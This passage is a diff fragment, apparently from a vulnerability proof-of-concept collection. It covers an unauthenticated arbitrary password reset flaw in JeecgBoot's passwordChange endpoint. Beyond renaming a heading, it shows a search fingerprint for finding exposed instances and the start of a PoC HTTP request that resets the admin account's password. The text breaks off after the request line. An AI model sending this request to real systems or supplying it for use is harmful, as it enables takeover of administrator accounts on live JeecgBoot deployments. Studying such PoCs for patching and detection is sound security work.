@@ -10,7 +10,7 @@ JeecgBoot系统接口passwordChange任意用户密码重置漏洞，未经身份
 body="/sys/common/pdf/pdfPreviewIframe"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /jeecg-boot/sys/user/passwordChange?username=admin&password=admin&smscode=&phone= HTTP/1.1
